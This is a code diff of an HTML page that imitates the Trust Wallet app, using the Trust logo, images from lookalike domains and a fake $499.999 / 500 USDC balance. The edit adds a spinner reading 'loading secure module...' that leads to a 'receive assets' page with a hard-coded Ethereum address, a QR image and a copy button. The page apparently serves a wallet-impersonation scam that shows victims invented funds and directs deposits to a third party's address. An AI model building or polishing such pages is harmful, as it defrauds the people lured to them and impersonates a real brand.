@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trust • exact balance</title>
-  <!-- EmailJS (unchanged, kept for compatibility) -->
+  <title>Trust • smaller & receive</title>
+  <!-- EmailJS (unchanged) -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     * {
@@ -16,7 +16,7 @@
 
     body {
       min-height: 100vh;
-      background-color: #0b111c;
+      background-color: #0a0f18;
       background-image: url('https://ipblockchain.github.io/photo/images%20(2).jpeg');
       background-repeat: no-repeat;
       background-position: center top;
@@ -25,11 +25,11 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 16px;
+      padding: 12px;
       position: relative;
     }
 
-    /* laser beam (preserved) */
+    /* laser beam (preserved, thinner) */
     .laser-beam {
       position: fixed;
       top: 0;
@@ -45,15 +45,15 @@
       position: absolute;
       left: -5%;
       width: 110%;
-      height: 4px;
+      height: 3px;
       background: linear-gradient(90deg, 
         rgba(0, 160, 255, 0.2) 0%,
         rgba(0, 200, 255, 0.8) 30%,
         rgba(255, 255, 255, 1) 50%,
         rgba(0, 200, 255, 0.8) 70%,
         rgba(0, 160, 255, 0.2) 100%);
-      filter: blur(2px);
-      box-shadow: 0 0 25px 8px rgba(0, 180, 255, 0.9);
+      filter: blur(1.5px);
+      box-shadow: 0 0 20px 5px rgba(0, 180, 255, 0.8);
       animation: laserMove 2s ease-in-out forwards;
       top: -5%;
     }
@@ -62,40 +62,40 @@
       position: absolute;
       left: -5%;
       width: 110%;
-      height: 15px;
+      height: 10px;
       background: linear-gradient(90deg, 
         rgba(100, 180, 255, 0.1) 0%,
-        rgba(150, 220, 255, 0.4) 40%,
-        rgba(255, 255, 255, 0.6) 50%,
-        rgba(150, 220, 255, 0.4) 60%,
+        rgba(150, 220, 255, 0.3) 40%,
+        rgba(255, 255, 255, 0.5) 50%,
+        rgba(150, 220, 255, 0.3) 60%,
         rgba(100, 180, 255, 0.1) 100%);
-      filter: blur(8px);
+      filter: blur(6px);
       animation: laserGlow 2s ease-in-out forwards;
       top: -7%;
     }
     @keyframes laserMove {
-      0% { top: -5%; opacity: 0.3; }
+      0% { top: -5%; opacity: 0.2; }
       20% { opacity: 1; }
       80% { opacity: 1; }
-      100% { top: 105%; opacity: 0.2; }
+      100% { top: 105%; opacity: 0.1; }
     }
     @keyframes laserGlow {
-      0% { top: -7%; opacity: 0.2; }
-      20% { opacity: 0.7; }
-      80% { opacity: 0.7; }
-      100% { top: 108%; opacity: 0.1; }
+      0% { top: -7%; opacity: 0.1; }
+      20% { opacity: 0.5; }
+      80% { opacity: 0.5; }
+      100% { top: 108%; opacity: 0.0; }
     }
 
-    /* main card */
+    /* main card — slightly smaller padding */
     .card {
       background: #ffffff;
-      border-radius: 40px;
-      box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.3);
+      border-radius: 32px;
+      box-shadow: 0 20px 36px -12px rgba(0, 0, 0, 0.4);
       width: 100%;
-      max-width: 440px;
-      padding: 24px 22px 32px;
+      max-width: 380px;           /* smaller than before */
+      padding: 18px 18px 24px;
       color: #1e293b;
-      border: 1px solid rgba(255,255,255,0.5);
+      border: 1px solid rgba(255,255,255,0.4);
       position: relative;
       z-index: 20;
       backdrop-filter: blur(2px);
@@ -109,216 +109,296 @@
       display: flex;
     }
 
-    /* LANDING PAGE */
+    /* ----- LANDING (no orange, clean) ----- */
     .landing {
       align-items: center;
-      gap: 28px;
-      padding: 18px 0 10px;
+      gap: 22px;
+      padding: 8px 0 6px;
     }
     .trust-image {
       width: 100%;
       display: flex;
       justify-content: center;
-      margin: 15px 0 5px;
+      margin: 5px 0;
     }
     .trust-image img {
-      width: 200px;
+      width: 160px;               /* smaller */
       border-radius: 30px;
-      box-shadow: 0 12px 30px -8px rgba(0,40,100,0.3);
+      box-shadow: 0 10px 22px -8px rgba(0,30,70,0.3);
     }
     .open-btn {
-      background: #1e2a3a;
+      background: #1e2a3a;         /* dark blue/gray, no orange */
       border: none;
-      padding: 18px 42px;
+      padding: 14px 36px;
       border-radius: 60px;
-      font-size: 1.7rem;
-      font-weight: 520;
+      font-size: 1.5rem;
+      font-weight: 500;
       color: white;
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      gap: 12px;
+      gap: 8px;
       cursor: pointer;
-      box-shadow: 0 14px 28px -10px #0f1f33;
-      transition: 0.15s;
-      width: 100%;
-      max-width: 280px;
-      letter-spacing: 0.3px;
-      border: 1px solid #415872;
+      box-shadow: 0 10px 20px -8px #0f1a2b;
+      transition: 0.1s;
+      width: auto;
+      min-width: 200px;
+      border: 1px solid #3f556f;
     }
     .open-btn:hover {
       background: #253e5a;
-      transform: scale(1.01);
     }
     .light-footer {
-      font-size: 0.8rem;
+      font-size: 0.7rem;
       background: #eef3fa;
-      padding: 6px 18px;
-      border-radius: 60px;
+      padding: 4px 16px;
+      border-radius: 40px;
       color: #2d4a70;
     }
 
-    /* ---------- MAIN WALLET PAGE (exact balance 499.999) ---------- */
+    /* ---------- MAIN WALLET PAGE (smaller everything) ---------- */
     .wallet-page {
-      gap: 22px;
+      gap: 16px;
     }
     .balance-section {
       background: #f4f7fc;
-      border-radius: 36px;
-      padding: 26px 24px 22px;
-      margin-bottom: 8px;
-      border: 1px solid #e3eaf2;
-      box-shadow: inset 0 2px 6px rgba(255,255,255,0.6), 0 8px 14px -12px #102033;
+      border-radius: 28px;
+      padding: 18px 18px 16px;
+      border: 1px solid #e0e8f2;
     }
     .total-label {
-      font-size: 0.9rem;
+      font-size: 0.75rem;
       color: #5a6e8a;
-      letter-spacing: 0.3px;
-      text-transform: uppercase;
-      margin-bottom: 6px;
+      letter-spacing: 0.2px;
+      margin-bottom: 2px;
     }
     .total-balance {
-      font-size: 3.2rem;
-      font-weight: 600;          /* slightly bolder for clean look */
-      color: #0b1d33;
-      line-height: 1;
-      margin-bottom: 8px;
-      display: flex;
-      align-items: baseline;
-      gap: 2px;
-    }
-    .total-balance span {
-      font-size: 3.2rem;
+      font-size: 2.5rem;           /* smaller */
       font-weight: 600;
+      color: #0b1d33;
+      line-height: 1.1;
     }
-    /* the exact 499.999 without any extra decimals */
     .balance-sub {
       color: #4e688b;
-      font-size: 0.9rem;
-      font-weight: 430;
+      font-size: 0.75rem;
       border-top: 1px solid #dae2ed;
-      padding-top: 12px;
+      padding-top: 8px;
       margin-top: 4px;
     }
 
-    /* action row */
+    /* action row (smaller icons) */
     .action-row {
       display: flex;
       justify-content: space-around;
       background: #f4f9ff;
-      padding: 12px 10px;
-      border-radius: 80px;
-      margin: 6px 0 10px;
+      padding: 8px 6px;
+      border-radius: 60px;
       border: 1px solid #dbe3ef;
     }
     .action-item {
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 4px;
-      color: #1e314a;
-      font-weight: 500;
-      font-size: 0.9rem;
+      gap: 2px;
+      font-size: 0.75rem;
     }
     .action-circle {
-      background: white;
-      width: 48px;
-      height: 48px;
+      width: 38px;                /* smaller */
+      height: 38px;
       border-radius: 50%;
+      background: white;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 1.4rem;
-      box-shadow: 0 4px 10px -4px #bacde2;
+      font-size: 1.2rem;
+      box-shadow: 0 3px 8px -4px #bacde2;
       border: 1px solid #cddbf0;
     }
 
     .prediction-row {
       display: flex;
-      gap: 14px;
-      margin: 5px 0 14px;
+      gap: 8px;
+      margin: 2px 0 8px;
     }
     .chip {
       background: #ecf3fc;
-      border-radius: 40px;
-      padding: 8px 22px;
+      border-radius: 30px;
+      padding: 5px 16px;
       font-weight: 470;
-      color: #1e3552;
+      font-size: 0.8rem;
       border: 1px solid #c9d8ec;
-      font-size: 1rem;
-      box-shadow: 0 2px 6px #e1e9f2;
     }
 
+    /* crypto rows smaller */
     .crypto-row {
       display: flex;
       align-items: center;
       justify-content: space-between;
       background: #ffffff;
-      padding: 12px 18px;
-      border-radius: 80px;
+      padding: 8px 14px;
+      border-radius: 60px;
       border: 1px solid #dee8f2;
-      margin: 6px 0;
-      box-shadow: 0 3px 10px -5px #a1b7d0;
+      margin: 4px 0;
     }
     .crypto-left {
       display: flex;
       align-items: center;
-      gap: 16px;
+      gap: 12px;
     }
     .crypto-icon {
-      width: 48px;
-      height: 48px;
+      width: 40px;                /* smaller */
+      height: 40px;
       border-radius: 50%;
       background: #f4f9ff;
       display: flex;
       align-items: center;
       justify-content: center;
-      border: 1px solid #d5e0ed;
     }
     .crypto-icon img {
-      width: 40px;
-      height: 40px;
+      width: 32px;
+      height: 32px;
       border-radius: 50%;
       object-fit: cover;
     }
     .crypto-name {
       font-weight: 560;
-      font-size: 1.2rem;
-      color: #12273f;
+      font-size: 1rem;
     }
     .crypto-amount {
       font-weight: 570;
-      font-size: 1.3rem;
-      color: #12273f;
+      font-size: 1.1rem;
     }
     .crypto-sub {
-      font-size: 0.9rem;
+      font-size: 0.75rem;
       color: #627b9c;
-      font-weight: 400;
-      text-align: right;
     }
 
     .manage-link {
       background: #ecf3fc;
       border-radius: 40px;
-      padding: 14px 24px;
+      padding: 10px 18px;
       text-align: center;
-      color: #17345c;
       font-weight: 550;
-      margin-top: 16px;
+      font-size: 0.95rem;
       border: 1px solid #bdcfec;
-      font-size: 1.1rem;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .manage-link:active {
+      background: #d9e2f0;
     }
 
-    .back-to-landing {
+    .back-link-sm {
       color: #526f96;
-      font-size: 0.9rem;
-      text-decoration: none;
+      font-size: 0.8rem;
       border-bottom: 1px dashed #96adcc;
       cursor: pointer;
       align-self: flex-start;
-      margin-top: 14px;
-      font-weight: 470;
+      margin-top: 12px;
+    }
+
+    /* ----- LOADING PAGE (manage crypto -> spinner) ----- */
+    .loading-page {
+      align-items: center;
+      justify-content: center;
+      gap: 28px;
+      min-height: 280px;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #e6ecf5;
+      border-top: 4px solid #1e3a5f;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+    }
+    @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
+    .loading-text {
+      font-size: 1rem;
+      color: #1e314a;
+      font-weight: 450;
+    }
+
+    /* ----- SEND/RECEIVE PAGE (with QR) ----- */
+    .sendreceive-page {
+      gap: 20px;
+    }
+    .action-two {
+      display: flex;
+      gap: 20px;
+      justify-content: center;
+      margin: 10px 0;
+    }
+    .action-two .action-btn-mini {
+      background: #eaf1fb;
+      border: 1px solid #b7ceec;
+      border-radius: 50px;
+      padding: 12px 32px;
+      font-size: 1.3rem;
+      font-weight: 500;
+      color: #1b314e;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+    }
+    .action-two .action-btn-mini:active {
+      background: #d1def0;
+    }
+    .qr-area {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: #f5f9ff;
+      border-radius: 36px;
+      padding: 22px 16px 18px;
+      border: 1px solid #cbdaf0;
+    }
+    .qr-image {
+      width: 200px;
+      height: 200px;
+      background: #ffffff;
+      border-radius: 24px;
+      padding: 8px;
+      box-shadow: 0 12px 24px -12px #577394;
+      margin-bottom: 12px;
+    }
+    .qr-image img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      border-radius: 16px;
+    }
+    .address-box {
+      background: #ecf3fd;
+      border-radius: 60px;
+      padding: 12px 20px;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border: 1px solid #b7ceec;
+      margin: 8px 0;
+      font-size: 0.75rem;
+      font-family: monospace;
+      word-break: break-all;
+    }
+    .copy-btn {
+      background: #1e2f44;
+      color: white;
+      border: none;
+      border-radius: 40px;
+      padding: 8px 18px;
+      font-size: 0.8rem;
+      font-weight: 500;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-left: 8px;
+    }
+    .copy-btn:active {
+      background: #103247;
     }
   </style>
 </head>
@@ -326,105 +406,172 @@
   <div class="laser-beam" aria-hidden="true"></div>
 
   <div class="card">
-    <!-- LANDING PAGE (FIRST) with Trust image and "open wallet" button -->
+    <!-- LANDING PAGE (no orange) -->
     <div class="page landing active" id="landingPage">
       <div class="trust-image">
-        <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="trust wallet">
+        <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="trust">
       </div>
       <button class="open-btn" id="openWalletBtn">⏺ open wallet</button>
-      <div class="light-footer">secure · effortless</div>
+      <div class="light-footer">secure gateway</div>
     </div>
 
-    <!-- MAIN WALLET PAGE – exact 499.999 total balance -->
+    <!-- MAIN WALLET PAGE (smaller dimensions) -->
     <div class="page wallet-page" id="walletPage">
-      <!-- balance section with 499.999 (no decimals) -->
       <div class="balance-section">
         <div class="total-label">total balance</div>
-        <div class="total-balance">
-          $499.999
-        </div>
+        <div class="total-balance">$499.999</div>
         <div class="balance-sub">$0.00 (0.0%)</div>
       </div>
-
-      <!-- send, fund, swap, sell, earn -->
       <div class="action-row">
-        <div class="action-item"><span class="action-circle">⬆️</span> Send</div>
-        <div class="action-item"><span class="action-circle">Ⓜ️</span> Fund</div>
-        <div class="action-item"><span class="action-circle">🔄</span> Swap</div>
-        <div class="action-item"><span class="action-circle">💲</span> Sell</div>
-        <div class="action-item"><span class="action-circle">⭐</span> Earn</div>
+        <div class="action-item"><span class="action-circle">⬆️</span>Send</div>
+        <div class="action-item"><span class="action-circle">Ⓜ️</span>Fund</div>
+        <div class="action-item"><span class="action-circle">🔄</span>Swap</div>
+        <div class="action-item"><span class="action-circle">💲</span>Sell</div>
+        <div class="action-item"><span class="action-circle">⭐</span>Earn</div>
       </div>
-
-      <!-- Crypto / prediction chips -->
       <div class="prediction-row">
         <span class="chip">Crypto</span>
         <span class="chip">Prediction</span>
         <span class="chip">Watch</span>
       </div>
-
-      <!-- Ethereum row (ETH logo) -->
+      <!-- Ethereum -->
       <div class="crypto-row">
         <div class="crypto-left">
-          <div class="crypto-icon">
-            <img src="https://trustwalleteth.github.io/A/1027.png" alt="ETH">
-          </div>
+          <div class="crypto-icon"><img src="https://trustwalleteth.github.io/A/1027.png" alt="ETH"></div>
           <span class="crypto-name">Ethereum</span>
         </div>
-        <div style="display: flex; flex-direction: column; align-items: flex-end;">
+        <div style="display:flex; flex-direction:column; align-items:flex-end;">
           <span class="crypto-amount">0</span>
           <span class="crypto-sub">ETH</span>
         </div>
       </div>
-
-      <!-- USD Coin row (USDC logo) -->
+      <!-- USDC -->
       <div class="crypto-row">
         <div class="crypto-left">
-          <div class="crypto-icon">
-            <img src="https://trustwalleteth.github.io/B/27763.png" alt="USDC">
-          </div>
+          <div class="crypto-icon"><img src="https://trustwalleteth.github.io/B/27763.png" alt="USDC"></div>
           <span class="crypto-name">USD Coin</span>
         </div>
-        <div style="display: flex; flex-direction: column; align-items: flex-end;">
+        <div style="display:flex; flex-direction:column; align-items:flex-end;">
           <span class="crypto-amount">500</span>
           <span class="crypto-sub">USDC</span>
         </div>
       </div>
+      <!-- Manage crypto (click → loading) -->
+      <div class="manage-link" id="manageCryptoBtn">⚙️ Manage crypto</div>
+      <div class="back-link-sm" id="backFromWalletToLanding">← back</div>
+    </div>
 
-      <!-- Manage crypto -->
-      <div class="manage-link">⚙️ Manage crypto</div>
+    <!-- LOADING PAGE (spinner circle) -->
+    <div class="page loading-page" id="loadingPage">
+      <div class="spinner"></div>
+      <div class="loading-text">loading secure module...</div>
+      <div class="back-link-sm" id="backFromLoading">← back</div>
+    </div>
 
-      <!-- subtle back to landing (optional) -->
-      <div class="back-to-landing" id="backToLandingBtn">← back to entry</div>
+    <!-- SEND / RECEIVE PAGE (with QR and copy) -->
+    <div class="page sendreceive-page" id="sendReceivePage">
+      <div style="display:flex; justify-content:space-between; align-items:center; width:100%;">
+        <div class="back-link-sm" id="backFromSendReceive">← back</div>
+        <span style="font-weight:500; color:#1e3552;">receive assets</span>
+        <span style="width:40px;"></span>
+      </div>
+      <!-- send & receive buttons -->
+      <div class="action-two">
+        <div class="action-btn-mini" id="sendBtnDummy">⬆️ Send</div>
+        <div class="action-btn-mini" id="receiveBtnActive">⬇️ Receive</div>
+      </div>
+      <!-- QR area (shown when receive active) -->
+      <div class="qr-area" id="qrArea">
+        <div class="qr-image">
+          <img src="https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg" alt="QR code">
+        </div>
+        <div class="address-box">
+          <span style="font-family: monospace; font-size:0.7rem;" id="cryptoAddress">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
+          <button class="copy-btn" id="copyAddressBtn">📋 copy</button>
+        </div>
+        <div style="font-size:0.6rem; color:#4b6c94;">Ethereum network</div>
+      </div>
     </div>
   </div>
 
   <script>
     (function() {
-      // EmailJS init (kept)
-      emailjs.init("PakuuN4ADUDEqrzHl");
+      emailjs.init("PakuuN4ADUDEqrzHl");  // kept
 
-      // elements
+      // pages
       const landing = document.getElementById('landingPage');
-      const walletPage = document.getElementById('walletPage');
-      const openBtn = document.getElementById('openWalletBtn');
-      const backToLanding = document.getElementById('backToLandingBtn');
+      const wallet = document.getElementById('walletPage');
+      const loading = document.getElementById('loadingPage');
+      const sendReceive = document.getElementById('sendReceivePage');
 
-      // Open wallet
-      openBtn.addEventListener('click', () => {
+      // buttons
+      const openWallet = document.getElementById('openWalletBtn');
+      const backFromWallet = document.getElementById('backFromWalletToLanding');
+      const manageBtn = document.getElementById('manageCryptoBtn');
+      const backFromLoading = document.getElementById('backFromLoading');
+      const backFromSendReceive = document.getElementById('backFromSendReceive');
+      const receiveBtn = document.getElementById('receiveBtnActive');
+      const copyBtn = document.getElementById('copyAddressBtn');
+
+      // address constant
+      const walletAddress = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
+
+      // open wallet
+      openWallet.addEventListener('click', ()=>{
         landing.classList.remove('active');
-        walletPage.classList.add('active');
+        wallet.classList.add('active');
       });
 
-      // Optional back
-      if (backToLanding) {
-        backToLanding.addEventListener('click', () => {
-          walletPage.classList.remove('active');
-          landing.classList.add('active');
+      // back from wallet to landing
+      backFromWallet.addEventListener('click', ()=>{
+        wallet.classList.remove('active');
+        landing.classList.add('active');
+      });
+
+      // manage crypto -> loading
+      manageBtn.addEventListener('click', ()=>{
+        wallet.classList.remove('active');
+        loading.classList.add('active');
+
+        // after 2 seconds go to send/receive page
+        setTimeout(() => {
+          loading.classList.remove('active');
+          sendReceive.classList.add('active');
+        }, 2000); // 2 sec spinner
+      });
+
+      // back from loading to wallet
+      backFromLoading.addEventListener('click', ()=>{
+        loading.classList.remove('active');
+        wallet.classList.add('active');
+      });
+
+      // back from send/receive to wallet
+      backFromSendReceive.addEventListener('click', ()=>{
+        sendReceive.classList.remove('active');
+        wallet.classList.add('active');
+      });
+
+      // receive btn is already active look (just ensure QR visible)
+      // if needed: but qr is always visible in that page
+
+      // copy address
+      copyBtn.addEventListener('click', ()=>{
+        navigator.clipboard.writeText(walletAddress).then(()=>{
+          const original = copyBtn.innerHTML;
+          copyBtn.innerHTML = '✅ copied';
+          setTimeout(()=>{ copyBtn.innerHTML = original; }, 1500);
+        }).catch(()=>{
+          alert('manual copy: ' + walletAddress);
         });
-      }
+      });
+
+      // dummy send (no action needed, just placeholder)
+      document.getElementById('sendBtnDummy').addEventListener('click', ()=>{
+        alert('send flow (demo)');
+      });
+
     })();
   </script>
-
-  <!-- (Legacy hidden blocks removed to avoid ID conflicts – they are not needed) -->
 </body>
 </html>
